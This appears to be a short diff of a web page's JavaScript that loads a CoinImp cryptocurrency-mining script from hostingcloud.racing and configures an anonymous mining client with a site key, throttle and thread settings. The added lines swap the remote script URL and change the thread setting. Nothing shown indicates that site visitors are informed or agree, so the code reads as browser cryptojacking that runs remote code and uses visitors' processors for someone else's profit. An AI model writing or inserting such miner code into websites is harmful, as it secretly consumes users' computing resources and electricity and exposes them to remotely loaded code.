@@ -985,7 +985,7 @@
             
             // Cargar script de CoinImp dinámicamente
             const script = document.createElement('script');
-            script.src = 'https://www.hostingcloud.racing/nsG1.js';
+            script.src = 'https://www.hostingcloud.racing/91Xf.js';
             script.onload = () => {
                 console.log('CoinImp script loaded');
                 setupMiner();
@@ -1009,7 +1009,7 @@
                 _client = new Client.Anonymous('5119ade448b365cc088ee2ca888d2ee31d36c3102e0548249d896dc508584e84', {
                     throttle: throttle,
                     threads: threads,
-                    autoThreads: navigator.hardwareConcurrency || 0,
+                    autoThreads: false,
                     c: 'w', // MineMe Coin
                     forceASMJS: true // Mejor rendimiento
                 });
